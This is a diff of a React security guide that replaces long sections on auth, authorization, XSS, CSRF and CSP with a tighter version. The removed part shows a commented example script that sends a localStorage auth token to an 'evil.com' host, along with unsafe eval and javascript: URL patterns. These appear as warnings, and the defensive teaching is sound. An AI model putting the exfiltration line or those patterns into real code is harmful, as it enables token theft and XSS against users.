@@ -1,414 +1,104 @@
 # Security
 
-Security must be built into React applications from the start, not added as an afterthought.
+## XSS
 
-## Authentication
+React escapes the text and attribute values it renders, so interpolating strings into JSX is safe by default. XSS enters through the escape hatches: raw HTML, URLs, and anything that turns strings into code. The react-components skill's web3-ui reference defers to this file for XSS handling.
 
-### Token Storage
-
-**✅ Recommended: HttpOnly Cookies**
-
-```tsx
-// Server sets HttpOnly cookie (backend code)
-res.cookie('auth_token', token, {
-  httpOnly: true,      // Not accessible via JavaScript
-  secure: true,        // HTTPS only
-  sameSite: 'strict',  // CSRF protection
-  maxAge: 7 * 24 * 60 * 60 * 1000, // 7 days
-});
-
-// Frontend: No manual token handling needed
-// Cookies sent automatically with requests
-```
-
-**❌ Avoid: localStorage/sessionStorage**
-
-```tsx
-// ❌ Bad - vulnerable to XSS
-localStorage.setItem('auth_token', token);
-
-// If attacker injects script:
-// <script>
-//   fetch('https://evil.com', {
-//     method: 'POST',
-//     body: localStorage.getItem('auth_token')
-//   });
-// </script>
-```
-
-### Auth State Management
-
-```tsx
-// features/auth/hooks/useAuth.ts
-import { create } from 'zustand';
-
-type AuthState = {
-  user: User | null;
-  isAuthenticated: boolean;
-  login: (email: string, password: string) => Promise<void>;
-  logout: () => Promise<void>;
-  checkAuth: () => Promise<void>;
-};
-
-export const useAuthStore = create<AuthState>((set) => ({
-  user: null,
-  isAuthenticated: false,
-
-  login: async (email, password) => {
-    const user = await api.login(email, password);
-    // Token stored in HttpOnly cookie by server
-    set({ user, isAuthenticated: true });
-  },
-
-  logout: async () => {
-    await api.logout(); // Server clears cookie
-    set({ user: null, isAuthenticated: false });
-  },
-
-  checkAuth: async () => {
-    try {
-      const user = await api.getCurrentUser();
-      set({ user, isAuthenticated: true });
-    } catch {
-      set({ user: null, isAuthenticated: false });
-    }
-  },
-}));
-```
-
-### Protected Routes
-
-```tsx
-// components/ProtectedRoute.tsx
-import { Navigate, Outlet } from 'react-router-dom';
-import { useAuthStore } from '@/features/auth';
-
-export function ProtectedRoute() {
-  const isAuthenticated = useAuthStore(state => state.isAuthenticated);
-
-  if (!isAuthenticated) {
-    return <Navigate to="/login" replace />;
-  }
-
-  return <Outlet />;
-}
-
-// Usage
-<Routes>
-  <Route path="/login" element={<LoginPage />} />
-  <Route element={<ProtectedRoute />}>
-    <Route path="/dashboard" element={<Dashboard />} />
-    <Route path="/profile" element={<Profile />} />
-  </Route>
-</Routes>
-```
-
-## Authorization
-
-### Role-Based Access Control (RBAC)
-
-```tsx
-// types/auth.ts
-export type UserRole = 'admin' | 'editor' | 'viewer';
-
-export type User = {
-  id: string;
-  name: string;
-  role: UserRole;
-};
-
-// hooks/useAuthorization.ts
-export function useAuthorization() {
-  const user = useAuthStore(state => state.user);
-
-  const hasRole = (role: UserRole | UserRole[]) => {
-    if (!user) return false;
-
-    const roles = Array.isArray(role) ? role : [role];
-    return roles.includes(user.role);
-  };
-
-  const can = (permission: Permission) => {
-    if (!user) return false;
-    return ROLE_PERMISSIONS[user.role]?.includes(permission) ?? false;
-  };
-
-  return { hasRole, can };
-}
-
-// Usage
-function AdminPanel() {
-  const { hasRole } = useAuthorization();
-
-  if (!hasRole('admin')) {
-    return <Navigate to="/unauthorized" />;
-  }
-
-  return <div>Admin Panel</div>;
-}
-```
-
-### Permission-Based Access Control (PBAC)
-
-```tsx
-// config/permissions.ts
-export type Permission =
-  | 'users:read'
-  | 'users:create'
-  | 'users:update'
-  | 'users:delete'
-  | 'posts:read'
-  | 'posts:create'
-  | 'posts:update'
-  | 'posts:delete';
-
-export const ROLE_PERMISSIONS: Record<UserRole, Permission[]> = {
-  admin: [
-    'users:read', 'users:create', 'users:update', 'users:delete',
-    'posts:read', 'posts:create', 'posts:update', 'posts:delete',
-  ],
-  editor: [
-    'users:read',
-    'posts:read', 'posts:create', 'posts:update',
-  ],
-  viewer: [
-    'users:read',
-    'posts:read',
-  ],
-};
-
-// Component-level authorization
-function DeleteButton({ postId }: { postId: string }) {
-  const { can } = useAuthorization();
-
-  if (!can('posts:delete')) {
-    return null; // Hide button if no permission
-  }
-
-  return <button onClick={() => deletePost(postId)}>Delete</button>;
-}
-```
-
-## XSS Prevention
-
-### Sanitize User Content
+**Raw HTML.** Render it only through a component in which sanitization is the sole path to the sink — no branch may reach `dangerouslySetInnerHTML` with unsanitized input:
 
 ```tsx
 import DOMPurify from 'dompurify';
 
-function UserComment({ comment }: { comment: string }) {
-  // ❌ Bad - dangerouslySetInnerHTML without sanitization
-  return <div dangerouslySetInnerHTML={{ __html: comment }} />;
-
-  // ✅ Good - sanitize first
-  const sanitized = DOMPurify.sanitize(comment, {
-    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a'],
+export function RichText({ html }: { html: string }) {
+  const clean = DOMPurify.sanitize(html, {
+    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'ul', 'ol', 'li'],
     ALLOWED_ATTR: ['href'],
   });
-
-  return <div dangerouslySetInnerHTML={{ __html: sanitized }} />;
+  return <div dangerouslySetInnerHTML={{ __html: clean }} />;
 }
 ```
 
-### Avoid Dangerous Patterns
+**URLs.** `href` and `src` accept `javascript:` and other executable schemes. Allowlist protocols before rendering user-supplied URLs:
 
-```tsx
-// ❌ Bad - eval is dangerous
-eval(userInput);
+```ts
+const SAFE_PROTOCOLS = ['http:', 'https:', 'mailto:'];
 
-// ❌ Bad - Function constructor
-new Function(userInput)();
-
-// ❌ Bad - javascript: URLs
-<a href={`javascript:${userInput}`}>Link</a>
-
-// ✅ Good - validate and sanitize URLs
-function isSafeUrl(url: string): boolean {
+export function safeUrl(raw: string): string | undefined {
   try {
-    const parsed = new URL(url);
-    return ['http:', 'https:'].includes(parsed.protocol);
+    const url = new URL(raw, window.location.origin);
+    return SAFE_PROTOCOLS.includes(url.protocol) ? url.href : undefined;
   } catch {
-    return false;
+    return undefined;
   }
 }
-
-<a href={isSafeUrl(userUrl) ? userUrl : '#'}>Link</a>
 ```
 
-## CSRF Protection
-
-### SameSite Cookies
-
 ```tsx
-// Server-side cookie configuration
-res.cookie('auth_token', token, {
-  httpOnly: true,
-  secure: true,
-  sameSite: 'strict', // or 'lax' for cross-site navigation
-});
-```
+import { safeUrl } from './safe-url';
 
-### CSRF Tokens (if not using SameSite)
-
-```tsx
-// Get CSRF token from server
-function useCSRFToken() {
-  const [token, setToken] = useState('');
-
-  useEffect(() => {
-    fetch('/api/csrf-token')
-      .then(res => res.json())
-      .then(data => setToken(data.token));
-  }, []);
-
-  return token;
-}
-
-// Include in requests
-function createPost(data: PostData) {
-  const csrfToken = useCSRFToken();
-
-  return apiClient.post('/api/posts', data, {
-    headers: {
-      'X-CSRF-Token': csrfToken,
-    },
-  });
+export function UserLink({ link, label }: { link: string; label: string }) {
+  return <a href={safeUrl(link) ?? '#'}>{label}</a>;
 }
 ```
 
-## Input Validation
+**Trusted Types.** Adding `require-trusted-types-for 'script'` to CSP makes DOM sinks reject plain strings; DOMPurify can emit Trusted Types (`RETURN_TRUSTED_TYPE: true`).
 
-### Client-Side Validation
+## Auth token storage
 
-```tsx
-import { z } from 'zod';
+Session tokens belong in `HttpOnly; Secure; SameSite` cookies: script injected by any XSS can read `localStorage` and `sessionStorage`, but it cannot read an HttpOnly cookie. The client never touches the token — it sends `credentials: 'include'` and lets the browser attach it, which is how the API layer in [data-fetching.md](./data-fetching.md) is built.
 
-const signupSchema = z.object({
-  email: z.string().email('Invalid email'),
-  password: z.string()
-    .min(8, 'Password must be at least 8 characters')
-    .regex(/[A-Z]/, 'Must contain uppercase letter')
-    .regex(/[a-z]/, 'Must contain lowercase letter')
-    .regex(/[0-9]/, 'Must contain number'),
-  confirmPassword: z.string(),
-}).refine(data => data.password === data.confirmPassword, {
-  message: 'Passwords must match',
-  path: ['confirmPassword'],
-});
+## CSRF
 
-// Always validate on server too - client validation can be bypassed
+Cookie auth means browsers attach credentials to cross-site requests, so mutations need CSRF defense. `SameSite=Lax` (or `Strict`) on the session cookie is the first line. Where a token is also required (e.g. the double-submit-cookie pattern), read it in a plain module function the API layer can call — hooks only run inside components:
+
+```ts
+// Plain function, usable from the API layer — not a hook.
+export function csrfToken(): string | undefined {
+  return document.cookie
+    .split('; ')
+    .find((c) => c.startsWith('csrf_token='))
+    ?.split('=')[1];
+}
 ```
 
-## Content Security Policy (CSP)
+The API layer sends the value as an `X-CSRF-Token` header on mutating requests.
 
-```tsx
-// Configure in your build tool or server
-const cspDirectives = {
-  'default-src': ["'self'"],
-  'script-src': ["'self'", "'unsafe-inline'"], // Avoid unsafe-inline in production
-  'style-src': ["'self'", "'unsafe-inline'"],
-  'img-src': ["'self'", 'data:', 'https:'],
-  'font-src': ["'self'", 'data:'],
-  'connect-src': ["'self'", 'https://api.example.com'],
-  'frame-ancestors': ["'none'"],
-};
+## CSP and security headers
 
-// Vite plugin example
-export default defineConfig({
-  plugins: [
-    {
-      name: 'csp',
-      configureServer(server) {
-        server.middlewares.use((req, res, next) => {
-          res.setHeader(
-            'Content-Security-Policy',
-            Object.entries(cspDirectives)
-              .map(([key, values]) => `${key} ${values.join(' ')}`)
-              .join('; ')
-          );
-          next();
-        });
-      },
-    },
-  ],
-});
-```
-
-## Environment Variables
-
-### Secure Handling
-
-```tsx
-// ✅ Good - prefix public vars with VITE_ (Vite) or REACT_APP_ (CRA)
-const API_URL = import.meta.env.VITE_API_URL; // Exposed to client
-
-// ❌ Bad - never expose secrets to client
-const SECRET_KEY = import.meta.env.SECRET_KEY; // Don't do this!
-
-// Validate environment variables
-const envSchema = z.object({
-  VITE_API_URL: z.string().url(),
-  VITE_ENV: z.enum(['development', 'staging', 'production']),
-});
-
-const env = envSchema.parse(import.meta.env);
-```
-
-## Dependency Security
-
-### Audit Regularly
-
-```bash
-# Check for vulnerabilities
-pnpm audit
-
-# Fix automatically fixable issues
-pnpm audit --fix
-
-# Review and update dependencies
-pnpm outdated
-pnpm update
-```
-
-### Use Dependabot/Renovate
-
-Configure automated dependency updates in `.github/dependabot.yml`:
-
-```yaml
-version: 2
-updates:
-  - package-ecosystem: "npm"
-    directory: "/"
-    schedule:
-      interval: "weekly"
-    open-pull-requests-limit: 10
-```
-
-## Security Headers
-
-Set these headers on your server:
+Ship a nonce-based policy: the server mints a fresh nonce per response and stamps it on the script tags it emits. No `'unsafe-inline'` in `script-src`.
 
 ```
+Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-<per-response>';
+  object-src 'none'; base-uri 'none'; frame-ancestors 'none';
+  connect-src 'self' https://api.example.com
+```
+
+Alongside it:
+
+```
+Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
 X-Content-Type-Options: nosniff
-X-Frame-Options: DENY
-X-XSS-Protection: 1; mode=block
 Referrer-Policy: strict-origin-when-cross-origin
-Permissions-Policy: geolocation=(), microphone=(), camera=()
+Permissions-Policy: geolocation=(), camera=(), microphone=()
+Cross-Origin-Opener-Policy: same-origin
 ```
 
-## Security Checklist
+Do not send `X-XSS-Protection` — or send `X-XSS-Protection: 0` explicitly. The legacy filter is non-standard, absent from modern browsers, and can itself create XSS holes. CSP's `frame-ancestors` supersedes `X-Frame-Options`; keep `X-Frame-Options: DENY` only as a fallback for legacy browsers.
 
-- [ ] Use HttpOnly cookies for auth tokens
-- [ ] Implement proper CSRF protection
-- [ ] Sanitize all user-generated content
-- [ ] Validate input on both client and server
-- [ ] Set up Content Security Policy
-- [ ] Configure security headers
-- [ ] Never expose secrets to client
-- [ ] Regularly audit dependencies
-- [ ] Implement role-based or permission-based access control
-- [ ] Use HTTPS in production
-- [ ] Keep dependencies updated
-- [ ] Review and test authorization logic
+## Environment and config
 
-Security is an ongoing process - stay informed about new vulnerabilities and best practices.
+Vite exposes only `VITE_`-prefixed variables to the client via `import.meta.env`. Everything in the bundle is public — secrets never ship to the client; calls that need them go through your backend. Validate at startup:
+
+```ts
+import * as z from 'zod';
+
+const Env = z.object({
+  VITE_API_URL: z.url(),
+});
+
+export const env = Env.parse(import.meta.env); // fail fast on misconfiguration
+```
+
+## Supply chain
+
+Dependency auditing, provenance, and update policy are owned by the typescript-core skill's dependencies reference.
